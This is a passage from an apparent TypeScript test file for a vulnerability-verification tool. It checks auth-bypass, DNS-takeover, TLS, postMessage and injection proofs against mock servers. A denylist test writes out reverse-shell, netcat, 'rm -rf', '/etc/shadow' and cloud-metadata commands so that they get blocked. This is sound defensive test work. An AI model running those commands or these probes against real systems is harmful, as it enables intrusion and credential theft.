      controlPassed: (.steps.control.status == 401 or .steps.control.status == 403 or .steps.control.status == 302),
      confirmed: (.steps.probe.status == 200 and (.steps.probe.body | contains("admin_panel_secret_view")) and ((.spaCatchall.allProbesMatchedCatchall // false) | not)),
      observed: ("control=" + (.steps.control.status | tostring) + ", probe=" + (.steps.probe.status | tostring)),
      expected: "401/403 on both control and probe"
    }`,
  }

  // Case A: Vulnerable fixture -> confirmed
  let mode: 'vulnerable' | 'edge_blocked' | 'spa_catchall' = 'vulnerable'
  const broker = new RequestBroker({
    resolve: async () => [publicAddr],
    transport: async (url, _addr, _sig, opts) => {
      if (mode === 'spa_catchall') {
        return {
          status: 200,
          headers: { 'content-type': 'text/html; charset=utf-8' },
          body: '<!doctype html><html><head><title>App</title></head><body><div id="root">SPA Shell admin_panel_secret_view</div></body></html>',
        }
      }
      if (url.pathname.startsWith('/.guardian-nonexistent-')) {
        return { status: 404, headers: { 'content-type': 'text/plain' }, body: 'Not Found' }
      }
      const hasSubreq = Boolean(opts?.headers?.['x-middleware-subrequest'])
      if (mode === 'vulnerable' && url.pathname === '/admin' && hasSubreq) {
        return { status: 200, headers: { 'content-type': 'application/json' }, body: '{"panel":"admin_panel_secret_view"}' }
      }
      return { status: 401, headers: { 'content-type': 'application/json' }, body: '{"error":"unauthorized"}' }
    },
  })

  const vulnRes = await verifyReplaySpec({ spec: cveReplaySpec, broker, backend, grant: makeGrant(), signal: AbortSignal.timeout(20_000) })
  assert.equal(vulnRes.verdict, 'confirmed')
  assert.equal(vulnRes.outcome.controlPassed, true)
  assert.equal(vulnRes.outcome.confirmed, true)

  // One-click Verify Fix retest while still vulnerable -> 'reproduced'
  const retestBefore = await retestReplaySpec({ spec: cveReplaySpec, broker, backend, grant: makeGrant(), signal: AbortSignal.timeout(20_000) })
  assert.equal(retestBefore.verdict, 'reproduced')

  // Case B: Edge-blocked / patched fixture -> dismissed (ruled out!) and retest -> 'fixed'
  mode = 'edge_blocked'
  const blockedRes = await verifyReplaySpec({ spec: cveReplaySpec, broker, backend, grant: makeGrant(), signal: AbortSignal.timeout(20_000) })
  assert.equal(blockedRes.verdict, 'dismissed')
  assert.equal(blockedRes.outcome.controlPassed, true)
  assert.equal(blockedRes.outcome.confirmed, false)

  const retestAfter = await retestReplaySpec({ spec: cveReplaySpec, broker, backend, grant: makeGrant(), signal: AbortSignal.timeout(20_000) })
  assert.equal(retestAfter.verdict, 'fixed')

  // Case C: SPA 200 index.html catch-all -> MUST be inconclusive (never confirmed!)
  mode = 'spa_catchall'
  const spaCatchallSpec: DeclarativeReplaySpec = {
    ...cveReplaySpec,
    // Even if an overly permissive jq tried to confirm on status 200, spaCatchallControl MUST force inconclusive!
    assertionsJq: '{ controlPassed: true, confirmed: (.steps.probe.status == 200), observed: "200 html", expected: "404" }',
  }
  const spaRes = await verifyReplaySpec({ spec: spaCatchallSpec, broker, backend, grant: makeGrant(), signal: AbortSignal.timeout(20_000) })
  assert.equal(spaRes.verdict, 'inconclusive')
  assert.equal(spaRes.outcome.confirmed, false)
  assert.match(spaRes.outcome.reason ?? '', /SPA catch-all/)
})

// ============================================================================
// 7. Zero-LLM Replay Verifier: dns_takeover, tls_audit, browser_dom (Real Playwright!)
// ============================================================================

test('verifies dns_takeover, tls_audit, and 100%-brokered Playwright browser_dom with third-party abort', { timeout: 30_000 }, async t => {
  const backend = new LinuxWorkerBackend()

  // dns_takeover
  let dangling = true
  const dnsBroker = new RequestBroker({
    resolve: async () => [publicAddr],
    dnsResolver: async () => ({
      a: dangling ? [] : ['93.184.216.34'],
      aaaa: [],
      cname: dangling ? ['unclaimed-org.github.io'] : [],
      txt: [],
      ns: [],
      nxdomain: false,
    }),
    transport: async () => ({
      status: dangling ? 404 : 200,
      headers: { 'content-type': 'text/html' },
      body: dangling ? "There isn't a GitHub Pages site here." : 'OK',
    }),
  })
  const dnsSpec: DeclarativeReplaySpec = {
    ...replayBaseFields(northstar),
    kind: 'dns_takeover',
    title: 'Dangling GitHub Pages CNAME Subdomain Takeover',
    category: 'dns-takeover-infra',
    cwe: 'CWE-284',
    targetOrigin: northstar,
    probePath: '/',
    assertionsJq: `{
      controlPassed: ((.dns.hostname | length) > 0),
      confirmed: (.analysis.likelyTakeover == true),
      observed: (.dns.cname | join(",")),
      expected: "No dangling third-party CNAME"
    }`,
  }
  const dnsConfirmed = await verifyReplaySpec({ spec: dnsSpec, broker: dnsBroker, backend, grant: makeGrant(), signal: AbortSignal.timeout(20_000) })
  assert.equal(dnsConfirmed.verdict, 'confirmed')
  dangling = false
  const dnsDismissed = await verifyReplaySpec({ spec: dnsSpec, broker: dnsBroker, backend, grant: makeGrant(), signal: AbortSignal.timeout(20_000) })
  assert.equal(dnsDismissed.verdict, 'dismissed')

  // tls_audit
  let weakTls = true
  const tlsBroker = new RequestBroker({
    resolve: async () => [publicAddr],
    tlsInspector: async () => ({
      protocol: weakTls ? 'TLSv1.1' : 'TLSv1.3',
      cipher: weakTls ? 'AES128-SHA' : 'TLS_AES_256_GCM_SHA384',
      authorized: !weakTls,
      authorizationError: weakTls ? 'CERT_HAS_EXPIRED' : null,
      subject: { CN: 'northstar.example' },
      issuer: { CN: 'Test CA' },
      sans: ['northstar.example'],
      validFrom: '2020-01-01T00:00:00Z',
      validTo: weakTls ? '2021-01-01T00:00:00Z' : '2030-01-01T00:00:00Z',
      fingerprint256: 'AA:BB',
      serialNumber: '01',
      daysUntilExpiry: weakTls ? -500 : 1000,
      expired: weakTls,
      hostnameMatchesSan: true,
      weakProtocol: weakTls,
    }),
  })
  const tlsSpec: DeclarativeReplaySpec = {
    ...replayBaseFields(northstar),
    kind: 'tls_audit',
    title: 'Deprecated TLSv1.1 and Expired Certificate',
    category: 'crypto-tls-transport',
    cwe: 'CWE-327',
    targetOrigin: northstar,
    assertionsJq: `{
      controlPassed: (.tls.tls.protocol != null),
      confirmed: (.tls.tls.weakProtocol == true or .tls.tls.expired == true),
      observed: (.tls.tls.protocol + " expired=" + (.tls.tls.expired | tostring)),
      expected: "TLSv1.2+ with valid certificate"
    }`,
  }
  const tlsConfirmed = await verifyReplaySpec({ spec: tlsSpec, broker: tlsBroker, backend, grant: makeGrant(), signal: AbortSignal.timeout(20_000) })
  assert.equal(tlsConfirmed.verdict, 'confirmed')
  weakTls = false
  const tlsDismissed = await verifyReplaySpec({ spec: tlsSpec, broker: tlsBroker, backend, grant: makeGrant(), signal: AbortSignal.timeout(20_000) })
  assert.equal(tlsDismissed.verdict, 'dismissed')

  // browser_dom via real Playwright Chromium + 100% RequestBroker routing + third-party trap server
  let thirdPartyHits = 0
  const thirdPartyServer = await httpFixture((_req, res) => {
    thirdPartyHits += 1
    res.writeHead(200, { 'content-type': 'application/javascript' }).end('window.__thirdPartyRan = true;')
  })
  t.after(() => thirdPartyServer.close())

  const brokeredPaths: string[] = []
  const browserBroker = new RequestBroker({
    resolve: async () => [publicAddr],
    transport: async url => {
      brokeredPaths.push(url.pathname)
      if (url.pathname === '/api/profile') {
        return { status: 200, headers: { 'content-type': 'application/json' }, body: '{"user":"alice"}' }
      }
      if (url.pathname === '/safe') {
        return {
          status: 200,
          headers: { 'content-type': 'text/html; charset=utf-8' },
          body: `<!doctype html><html><head><title>Safe Page</title></head><body>
            <script>
              window.addEventListener('message', function(e) { if (e.origin === 'https://northstar.example') console.log(e.data); });
            </script>
          </body></html>`,
        }
      }
      return {
        status: 200,
        headers: { 'content-type': 'text/html; charset=utf-8' },
        body: `<!doctype html><html><head><title>PostMessage Sink</title></head><body>
          <script src="${thirdPartyServer.url}/tracker.js"></script>
          <a href="/account">Account</a>
          <script>
            localStorage.setItem('auth_token_key', ['secret', 'storage', 'value', '123'].join('-'));
            fetch('/api/profile');
            window.addEventListener('message', function(ev) {
              document.body.dataset.lastMsg = JSON.stringify(ev.data);
            });
          </script>
        </body></html>`,
      }
    },
  })
  const scopedBrowser = new ScopedBrowser(browserBroker)
  const domSpec: DeclarativeReplaySpec = {
    ...replayBaseFields(northstar),
    kind: 'browser_dom',
    title: 'Unchecked postMessage Listener Accepts Untrusted Origins',
    category: 'cors-client-side',
    cwe: 'CWE-345',
    targetOrigin: northstar,
    controlPath: '/safe',
    probePath: '/vulnerable',
    checkKind: 'postmessage',
    assertionsJq: `{
      controlPassed: (.control.postMessageListeners.canaryHandledWithoutOriginCheck == false),
      confirmed: (.probe.postMessageListeners.canaryHandledWithoutOriginCheck == true and ((.probe.blockedOrigins | length) >= 1)),
      observed: ("unchecked=" + (.probe.postMessageListeners.canaryHandledWithoutOriginCheck | tostring) + ", blocked=" + (.probe.blockedOrigins | join(","))),
      expected: "All postMessage listeners validate event.origin"
    }`,
  }
  const domRes = await verifyReplaySpec({
    spec: domSpec,
    broker: browserBroker,
    browser: scopedBrowser,
    backend,
    grant: makeGrant(),
    signal: AbortSignal.timeout(25_000),
  })
  assert.equal(domRes.verdict, 'confirmed')
  assert.equal(thirdPartyHits, 0, 'Unapproved third-party subresource MUST NEVER receive a direct socket connection!')
  assert.ok(brokeredPaths.includes('/safe'))
  assert.ok(brokeredPaths.includes('/vulnerable'))
  assert.ok(brokeredPaths.includes('/api/profile'))
  // Storage value must NOT leak; only key name captured
  const probePayload = domRes.evidencePayload.probe as { localStorageKeys: string[]; blockedOrigins: string[] }
  assert.ok(probePayload.localStorageKeys.includes('auth_token_key'))
  assert.ok(!JSON.stringify(domRes.evidencePayload).includes('secret-storage-value-123'))
  assert.ok(probePayload.blockedOrigins.some(o => o.startsWith('http://127.0.0.1:')))
})

// ============================================================================
// 8. Zero-LLM rce_proof: dynamic_math, split_echo, oob_canary, anti-reflection, denylist & Tier 3 Gate
// ============================================================================

test('enforces rce_proof cryptographic nonces (dynamic_math, split_echo, oob_canary), blocks raw reflection, destructive payloads, and Tier<3', async () => {
  const backend = new LinuxWorkerBackend()

  // Destructive payloads rejected by schema & helper
  for (const bad of [
    'rm -rf /tmp/x',
    'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1',
    'nc -e /bin/sh 1.2.3.4 4444',
    'cat /etc/shadow',
    'curl http://169.254.169.254/latest/meta-data/',
  ]) {
    assert.equal(containsDestructivePayload(bad), true, `Must flag destructive payload: ${bad}`)
  }

  const destructiveSpec = {
    ...replayBaseFields(northstar),
    kind: 'rce_proof',
    proofMode: 'split_echo',
    requiresTier3Approval: true,
    controlStep: { id: 'control', role: 'control', description: 'clean', request: { origin: northstar, method: 'POST', pathAndQuery: '/run', textBody: 'hello' } },
    probeStep: { id: 'probe', role: 'probe', description: 'bad', request: { origin: northstar, method: 'POST', pathAndQuery: '/run', textBody: 'rm -rf / && echo "{{nonce_part1}}""{{nonce_part2}}"' } },
    assertionsJq: '{ controlPassed: true, confirmed: true, observed: "x", expected: "y" }',
  }
  assert.equal(declarativeReplaySpecSchema.safeParse(destructiveSpec).success, false)

  // dynamic_math spec
  const mathSpec: Extract<DeclarativeReplaySpec, { kind: 'rce_proof' }> = {
    ...replayBaseFields(northstar),
    kind: 'rce_proof',
    title: 'Server-Side Template Injection (Dynamic Prime Multiplication)',
    category: 'injection-input',
    cwe: 'CWE-94',
    severity: 'critical',
    proofMode: 'dynamic_math',
    requiresTier3Approval: true,
    controlStep: {
      id: 'control', role: 'control', description: 'Benign template input',
      request: { origin: northstar, method: 'POST', pathAndQuery: '/render', jsonBody: { tpl: 'hello' }, followRedirects: false },
    },
    probeStep: {
      id: 'probe', role: 'probe', description: 'Evaluate fresh unseen prime multiplication',
      request: { origin: northstar, method: 'POST', pathAndQuery: '/render', jsonBody: { tpl: '{{nonce_a}}*{{nonce_b}}' }, followRedirects: false },
    },
    assertionsJq: `{
      controlPassed: (.control.status == 200 and (.proof.productInControl == false)),
      confirmed: (.proof.mathVerified == true),
      observed: .probe.bodyPreview,
      expected: "Expression not evaluated server-side"
    }`,
  }

  let evalMode: 'execute' | 'reflect' = 'execute'
  const mathBroker = new RequestBroker({
    resolve: async () => [publicAddr],
    transport: async (_url, _addr, _sig, opts) => {
      const parsed = JSON.parse(opts?.body ?? '{}') as { tpl?: string }
      const tpl = parsed.tpl ?? ''
      if (evalMode === 'execute') {
        const m = /^(\d+)\*(\d+)$/.exec(tpl)
        if (m) return { status: 200, headers: { 'content-type': 'text/plain' }, body: `Result: ${Number(m[1]) * Number(m[2])}` }
      }
      // Raw input reflection!
      return { status: 200, headers: { 'content-type': 'text/plain' }, body: `Echoed: ${tpl}` }
    },
  })

  // Blocked at Tier 2
  const blockedTier2 = await verifyReplaySpec({ spec: mathSpec, broker: mathBroker, backend, grant: makeGrant({ tier: 2 }), signal: AbortSignal.timeout(15_000) })
  assert.equal(blockedTier2.verdict, 'inconclusive')
  assert.match(blockedTier2.outcome.reason ?? '', /Tier 3/)

  // Blocked at Tier 3 when HITL approval is false
  const blockedNoHitl = await verifyReplaySpec({
    spec: mathSpec, broker: mathBroker, backend,
    grant: makeGrant({ tier: 3, isStateChangeApproved: () => false }),
    signal: AbortSignal.timeout(15_000),
  })
  assert.equal(blockedNoHitl.verdict, 'inconclusive')
  assert.match(blockedNoHitl.outcome.reason ?? '', /HITL/)

  const tier3ApprovedGrant = makeGrant({ tier: 3, isStateChangeApproved: () => true })

  // Executing fixture -> confirmed
  const mathConfirmed = await verifyReplaySpec({ spec: mathSpec, broker: mathBroker, backend, grant: tier3ApprovedGrant, signal: AbortSignal.timeout(20_000) })
  assert.equal(mathConfirmed.verdict, 'confirmed')

  // Raw reflection fixture -> MUST FAIL confirmation (dismissed)
  evalMode = 'reflect'
  const mathReflected = await verifyReplaySpec({ spec: mathSpec, broker: mathBroker, backend, grant: tier3ApprovedGrant, signal: AbortSignal.timeout(20_000) })
  assert.equal(mathReflected.verdict, 'dismissed')
  assert.equal(mathReflected.outcome.confirmed, false)

  // split_echo spec
  const splitSpec: Extract<DeclarativeReplaySpec, { kind: 'rce_proof' }> = {
    ...replayBaseFields(northstar),
    kind: 'rce_proof',
    title: 'Command Injection (Split-Echo Non-Reflectable Proof)',
    category: 'injection-input',
    cwe: 'CWE-78',
    severity: 'critical',
    proofMode: 'split_echo',
    requiresTier3Approval: true,
    controlStep: {
      id: 'control', role: 'control', description: 'Benign arg',
      request: { origin: northstar, method: 'POST', pathAndQuery: '/cmd', jsonBody: { cmd: 'echo safe' }, followRedirects: false },
    },
    probeStep: {
      id: 'probe', role: 'probe', description: 'Concatenated split echo',
      request: { origin: northstar, method: 'POST', pathAndQuery: '/cmd', jsonBody: { cmd: 'printf "%s%s" "{{nonce_part1}}" "{{nonce_part2}}"' }, followRedirects: false },
    },
    assertionsJq: `{
      controlPassed: (.control.status == 200),
      confirmed: (.proof.splitEchoVerified == true),
      observed: .probe.bodyPreview,
      expected: "Shell concatenation not executed"
    }`,
  }

  let splitMode: 'execute' | 'reflect' = 'execute'
  const splitBroker = new RequestBroker({
    resolve: async () => [publicAddr],
    transport: async (_url, _addr, _sig, opts) => {
      const parsed = JSON.parse(opts?.body ?? '{}') as { cmd?: string }
      const cmd = parsed.cmd ?? ''
      if (splitMode === 'execute') {
        const m = /printf "%s%s" "([^"]+)" "([^"]+)"/.exec(cmd)
        if (m) return { status: 200, headers: { 'content-type': 'text/plain' }, body: m[1] + m[2] }
      }
      return { status: 200, headers: { 'content-type': 'text/plain' }, body: cmd }
    },
  })
  const splitConfirmed = await verifyReplaySpec({ spec: splitSpec, broker: splitBroker, backend, grant: tier3ApprovedGrant, signal: AbortSignal.timeout(20_000) })
  assert.equal(splitConfirmed.verdict, 'confirmed')

  splitMode = 'reflect'
  const splitReflected = await verifyReplaySpec({ spec: splitSpec, broker: splitBroker, backend, grant: tier3ApprovedGrant, signal: AbortSignal.timeout(20_000) })
  assert.equal(splitReflected.verdict, 'dismissed')

  // Adjacent template without concatenation syntax is rejected outright
  const badSplitTemplate: DeclarativeReplaySpec = {
    ...splitSpec,
    probeStep: { ...splitSpec.probeStep, request: { ...splitSpec.probeStep.request, jsonBody: { cmd: '{{nonce_part1}}{{nonce_part2}}' } } },
  }
  const splitBadRes = await verifyReplaySpec({ spec: badSplitTemplate, broker: splitBroker, backend, grant: tier3ApprovedGrant, signal: AbortSignal.timeout(20_000) })
  assert.equal(splitBadRes.verdict, 'inconclusive')
  assert.match(splitBadRes.outcome.reason ?? '', /separated by execution concatenation/)

  // oob_canary spec with real local CanaryBroker listener
  const canaryBroker = new CanaryBroker()
  const oobSpec: Extract<DeclarativeReplaySpec, { kind: 'rce_proof' }> = {
    ...replayBaseFields(northstar),
    kind: 'rce_proof',
    title: 'Blind Async Command Execution (OOB Canary Proof)',
    category: 'injection-input',
    cwe: 'CWE-78',
    severity: 'critical',
    proofMode: 'oob_canary',
    requiresTier3Approval: true,
    controlStep: {
      id: 'control', role: 'control', description: 'Control inert request',
      request: { origin: northstar, method: 'POST', pathAndQuery: '/job', jsonBody: { mode: 'noop', url: '{{canary_url}}' }, followRedirects: false },
    },
    probeStep: {
      id: 'probe', role: 'probe', description: 'Trigger benign canary callback',
      request: { origin: northstar, method: 'POST', pathAndQuery: '/job', jsonBody: { mode: 'exec', url: '{{canary_url}}' }, followRedirects: false },
    },
    assertionsJq: `{
      controlPassed: (.control.status == 202 and (.proof.canaryControlTriggered == false)),
      confirmed: (.proof.canaryProbeTriggered == true),
      observed: ("probeCanary=" + (.proof.canaryProbeTriggered | tostring)),
      expected: "No outbound callback triggered"
    }`,
  }

  let triggerProbe = true
  const oobBroker = new RequestBroker({
    resolve: async () => [publicAddr],
    transport: async (_url, _addr, _sig, opts) => {
      const parsed = JSON.parse(opts?.body ?? '{}') as { mode?: string; url?: string }
      if (triggerProbe && parsed.mode === 'exec' && parsed.url) {
        // Simulate asynchronous server-side callback to Guardian's local canary listener
        void fetch(parsed.url, { signal: AbortSignal.timeout(3_000) }).catch(() => undefined)
      }
      return { status: 202, headers: { 'content-type': 'application/json' }, body: '{"queued":true}' }
    },
  })
  try {
    const oobConfirmed = await verifyReplaySpec({
      spec: oobSpec, broker: oobBroker, canaryBroker, backend, grant: tier3ApprovedGrant, signal: AbortSignal.timeout(20_000),
    })
    assert.equal(oobConfirmed.verdict, 'confirmed')

    triggerProbe = false
    const oobSilent = await verifyReplaySpec({
      spec: oobSpec, broker: oobBroker, canaryBroker, backend, grant: tier3ApprovedGrant, signal: AbortSignal.timeout(20_000),
    })
    assert.equal(oobSilent.verdict, 'dismissed')
  } finally {
    await canaryBroker.stop()
  }
})

// ============================================================================
// 9. Transitive Scope-Revocation Tainting, Cold-Graph Digest Compaction, and budget_paused -> Resume
// ============================================================================

test('transitively taints downstream graph nodes on scope revocation, compacts cold facts into digests, and enforces budget_paused -> resume', async t => {
  const dir = mkdtempSync(join(tmpdir(), 'guardian-graph-budget-'))
  t.after(() => rmSync(dir, { recursive: true, force: true }))
  const storage = new Store(dir)
  t.after(() => storage.close())

  // Local mock LLM server for ColdGraphCompactor minor digest summarization
  const llmServer = await httpFixture((req, res) => {
    req.resume()
    res.writeHead(200, { 'Content-Type': 'text/event-stream' })
    res.end([
      `data: ${JSON.stringify({ type: 'response.output_item.added', output_index: 0, item: { type: 'message', id: 'm1', role: 'assistant', content: [], status: 'in_progress' } })}`,
      `data: ${JSON.stringify({ type: 'response.output_text.delta', output_index: 0, delta: 'Cold digest summary: recon facts for api.northstar.example.' })}`,
      `data: ${JSON.stringify({ type: 'response.output_item.done', output_index: 0, item: { type: 'message', id: 'm1', role: 'assistant', content: [{ type: 'output_text', text: 'Cold digest summary: recon facts for api.northstar.example.' }], status: 'completed' } })}`,
      `data: ${JSON.stringify({ type: 'response.completed', response: { id: 'r1', status: 'completed', output: [], usage: { input_tokens: 200, output_tokens: 40 } } })}`,
      'data: [DONE]',
    ].join('\n\n') + '\n\n')
  })
  t.after(() => llmServer.close())

  await saveModelProfile({
    name: 'Compactor Fixture',
    endpoint: llmServer.url,
    model: 'compactor-fixture',
    protocol: 'responses',
    key: 'compactor-fixture-key-1234',
    priority: 100,
  }, storage, { skipConnectionCheck: true })

  const { id: projectId } = storage.createProject({
    requestId: randomUUID(), name: 'Chain Graph Test', seeds: [northstar, apiOrigin], environment: 'public',
  })
  const { id: runId } = storage.createRun({
    requestId: randomUUID(), projectId, goal: 'Multi-step chain + compaction + budget test', sourceMode: 'public',
    capabilityTier: 1, budgetUsd: 1.0, budgetRequests: 10, maxRpsPerOrigin: 5, workerConcurrency: 4, workerMaxTurns: 50,
  })
  storage.command({ requestId: randomUUID(), runId, action: 'discover', consent: true })
  const assetA = storage.run(runId).candidates.find(c => c.origin === northstar)!
  const assetB = storage.run(runId).candidates.find(c => c.origin === apiOrigin)!
  storage.command({ requestId: randomUUID(), runId, action: 'scope', expectedScopeRevision: 0, assetIds: [assetA.id, assetB.id], consent: true })

  const run1 = storage.run(runId)
  // Step 1 on origin A -> yields Fact 1 (origin A)
  const step1 = storage.addChainStep(run1, {
    title: 'Harvest JS from northstar.example',
    hypothesis: 'Find hidden API paths on api.northstar.example',
    targetAssetIds: [assetA.id],
    sourceOrigins: [northstar],
  })
  const worker1 = storage.makeWorker(run1, 'investigation', assetA, step1.title, step1.hypothesis, { stepId: step1.id })
  storage.updateChainStep(step1.id, { status: 'complete', assignedWorkerId: worker1.id })
  storage.updateWorker(worker1.id, { status: 'complete' })
  const fact1 = storage.addFact(run1, worker1, {
    kind: 'endpoint',
    origin: northstar,
    summary: 'Found hidden endpoint /api/internal on api.northstar.example',
    sourceOrigins: [northstar],
  })

  // Step 2 on origin B dependsOnFactIds: [fact1.id] -> yields Fact 2 (origin B, transitively dependent on A!)
  const step2 = storage.addChainStep(run1, {
    title: 'Probe /api/internal on api.northstar.example',
    hypothesis: 'Test auth bypass on discovered endpoint',
    targetAssetIds: [assetB.id],
    dependsOnFactIds: [fact1.id],
  })
  const worker2 = storage.makeWorker(run1, 'investigation', assetB, step2.title, step2.hypothesis, {
    stepId: step2.id,
    parentFactIds: [fact1.id],
  })
  storage.updateChainStep(step2.id, { status: 'complete', assignedWorkerId: worker2.id })
  storage.updateWorker(worker2.id, { status: 'complete' })
  const fact2 = storage.addFact(run1, worker2, {
    kind: 'policy_gap',
    origin: apiOrigin,
    summary: 'Auth gap on /api/internal derived from Step 1',
  })

  // Step 3 on origin B dependsOnStepIds: [step2.id] (still pending/ready)
  const step3 = storage.addChainStep(run1, {
    title: 'Verify escalation on api.northstar.example',
    hypothesis: 'Escalate Step 2 finding',
    targetAssetIds: [assetB.id],
    dependsOnStepIds: [step2.id],
  })

  // Independent completed worker & 5 facts strictly on origin B (NOT dependent on origin A) for cold-graph compaction
  const cleanWorker = storage.makeWorker(run1, 'investigation', assetB, 'Clean api recon', 'Independent api recon')
  storage.updateWorker(cleanWorker.id, { status: 'complete' })
  for (let i = 0; i < 5; i += 1) {
    storage.addFact(run1, cleanWorker, {
      kind: 'header',
      origin: apiOrigin,
      summary: `Independent api.northstar.example header observation #${i}`,
    })
  }

  // Run ColdGraphCompactor across 4 idle planner rounds -> triggers minor compaction!
  const compactor = new ColdGraphCompactor({ coldAfterRounds: 4, minorThreshold: 5 })
  const profiles = privateModelProfiles(storage)
  let triggered: string = 'none'
  for (let r = 0; r < 5; r += 1) {
    const res = compactor.onPlannerRound(storage, runId, profiles, AbortSignal.timeout(10_000))
    if (res.promise) {
      await res.promise
      triggered = res.triggered
      break
    }
  }
  assert.equal(triggered, 'minor')
  const digests = storage.listDigests(runId, true)
  assert.ok(digests.length >= 1)
  const expanded = compactor.expandDigest(storage, runId, digests[0].id)
  assert.ok(expanded)
  assert.ok(expanded.facts.length >= 5)

  // Save report v1 BEFORE revoking origin A
  storage.writeReport(storage.run(runId), true)
  const reportV1 = storage.runDetail(runId).reports[0]
  assert.ok(reportV1)
  const mdV1 = exportReportMarkdown(storage, runId, reportV1.id).content

  // Now REVOKE northstar.example (origin A) while keeping api.northstar.example (origin B)
  storage.command({
    requestId: randomUUID(), runId, action: 'scope', expectedScopeRevision: 1, assetIds: [assetB.id], consent: true,
  })

  // Verify transitive tainting: fact1, fact2, step1, step2, AND step3 are all tainted!
  const allFactsAfter = storage.listFacts(runId, { includeTainted: true })
  assert.equal(allFactsAfter.find(f => f.id === fact1.id)?.tainted, true)
  assert.equal(allFactsAfter.find(f => f.id === fact2.id)?.tainted, true)
  // Independent origin B facts remain untainted
  const cleanFactsAfter = storage.listFacts(runId, { includeTainted: false, origin: apiOrigin })
  assert.equal(cleanFactsAfter.length, 5)

  const allStepsAfter = storage.listChainSteps(runId)
  assert.equal(allStepsAfter.find(s => s.id === step1.id)?.status, 'tainted')
  assert.equal(allStepsAfter.find(s => s.id === step2.id)?.status, 'tainted')
  assert.equal(allStepsAfter.find(s => s.id === step3.id)?.status, 'tainted')

  // Report v1 stays byte-for-byte immutable; new report omits northstar.example
  assert.equal(exportReportMarkdown(storage, runId, reportV1.id).content, mdV1)
  storage.writeReport(storage.run(runId), true)
  const reportV2 = storage.runDetail(runId).reports[0]
  assert.equal(reportV2.body.scope.some(c => c.origin === northstar), false)

  // Budget governor: spend >= budgetUsd -> budget_paused + partial report -> resume blocked until raise_budget
  storage.recordLlmSpend(runId, { usd: 1.25, tokens: 50_000, turns: 12 })
  assert.equal(storage.checkBudgetExceeded(runId), true)
  assert.equal(storage.run(runId).status, 'budget_paused')
  assert.throws(
    () => storage.command({ requestId: randomUUID(), runId, action: 'resume' }),
    /Raise the run budget/,
  )
  storage.command({ requestId: randomUUID(), runId, action: 'raise_budget', budgetUsd: 10.0, resume: true })
  assert.equal(storage.run(runId).status, 'running')
  assert.equal(storage.run(runId).budgetUsd, 10.0)
})

// ============================================================================
// 10. Read-Only Cloned GitHub Repos Mounted at /repos Inside Air-Gapped Worker
// ============================================================================

test('clones full repos without .git/credentials, extracts deep lockfiles, and mounts /repos read-only without symlink escapes in Docker worker', { timeout: 45_000 }, async t => {
  const workDir = mkdtempSync(join(tmpdir(), 'guardian-repos-test-'))
  t.after(() => rmSync(workDir, { recursive: true, force: true }))

  // 1. PAT 0600 permission check & invalid owner/repo validation
  const patPath = join(workDir, 'github.pat')
  const testPat = 'ghp_testSecretTokenValue1234567890'
  writeFileSync(patPath, testPat + '\n', { mode: 0o644 })
  chmodSync(patPath, 0o644)
  await assert.rejects(
    cloneGithubRepos(['acme/demo-app'], join(workDir, 'data', 'repos', 'proj-1'), AbortSignal.timeout(10_000), { patPath }),
    /0600 permissions/,
  )
  chmodSync(patPath, 0o600)

  await assert.rejects(
    cloneGithubRepos(['../etc/passwd'], join(workDir, 'data', 'repos', 'proj-1'), AbortSignal.timeout(10_000), { patPath }),
    /Invalid GitHub repository name/,
  )

  // 2. Verify HTTP clone authenticates via Authorization: Basic header (NEVER PAT in URL) and redacts PAT on failure
  let seenAuthHeader = ''
  let seenReqUrl = ''
  const authServer = await httpFixture((req, res) => {
    seenAuthHeader = String(req.headers.authorization ?? '')
    seenReqUrl = String(req.url ?? '')
    res.writeHead(403, { 'content-type': 'text/plain' }).end(`denied for ${testPat}`)
  })
  t.after(() => authServer.close())

  await assert.rejects(
    cloneGithubRepos(['acme/private-repo'], join(workDir, 'data', 'repos', 'proj-auth'), AbortSignal.timeout(10_000), {
      patPath,
      gitBaseUrl: authServer.url,
    }),
    err => {
      const msg = err instanceof Error ? err.message : String(err)
      assert.ok(!msg.includes(testPat), 'Raw PAT must never appear in git error messages.')
      return /git clone failed/.test(msg)
    },
  )
  const expectedBasic = 'Basic ' + Buffer.from(`x-access-token:${testPat}`, 'utf8').toString('base64')
  assert.equal(seenAuthHeader, expectedBasic)
  assert.ok(!seenReqUrl.includes(testPat), 'PAT must never be embedded in remote URL.')

  // 3. Create a real local bare Git repo with >45 files and nested multi-ecosystem manifests/lockfiles
  const gitOriginParent = join(workDir, 'git-origin')
  const srcRepo = join(workDir, 'src-repo')
  const bareRepo = join(gitOriginParent, 'acme', 'demo-app.git')
  mkdirSync(srcRepo, { recursive: true })
  mkdirSync(join(gitOriginParent, 'acme'), { recursive: true })

  await exec('git', ['init', '-b', 'main', srcRepo])
  await exec('git', ['-C', srcRepo, 'config', 'user.email', 'test@guardian.local'])
  await exec('git', ['-C', srcRepo, 'config', 'user.name', 'Guardian Test'])

  // Create >45 filler files so we prove no 40-file cap applies to full clone / dependency walk
  mkdirSync(join(srcRepo, 'src', 'routes'), { recursive: true })
  for (let i = 0; i < 45; i += 1) {
    writeFileSync(join(srcRepo, 'src', 'routes', `route-${String(i).padStart(2, '0')}.ts`), `export const routeId = ${i}\n`)
  }
  mkdirSync(join(srcRepo, 'apps', 'admin', 'api'), { recursive: true })
  writeFileSync(
    join(srcRepo, 'apps', 'admin', 'api', 'auth.ts'),
    'export function checkAdminHeader(req: Request) { return req.headers.get("x-internal-bypass") === "1" }\n',
  )
  writeFileSync(
    join(srcRepo, 'package.json'),
    JSON.stringify({ name: 'demo-app', dependencies: { next: '^14.2.0', express: '^4.19.0' } }, null, 2),
  )
  mkdirSync(join(srcRepo, 'packages', 'web'), { recursive: true })
  writeFileSync(
    join(srcRepo, 'packages', 'web', 'pnpm-lock.yaml'),
    "lockfileVersion: '9.0'\npackages:\n  'next@14.2.20':\n    resolution: {integrity: sha512-x}\n",
  )
  mkdirSync(join(srcRepo, 'services', 'yarn-svc'), { recursive: true })
  writeFileSync(
    join(srcRepo, 'services', 'yarn-svc', 'yarn.lock'),
    '"fastify@^4.28.0":\n  version "4.28.1"\n',
  )
  mkdirSync(join(srcRepo, 'services', 'py-svc'), { recursive: true })
  writeFileSync(
    join(srcRepo, 'services', 'py-svc', 'pyproject.toml'),
    '[project]\nname = "py-svc"\ndependencies = [\n  "fastapi>=0.115.0",\n  "django==5.1.2",\n]\n',
  )
  mkdirSync(join(srcRepo, 'services', 'rust-svc'), { recursive: true })
  writeFileSync(
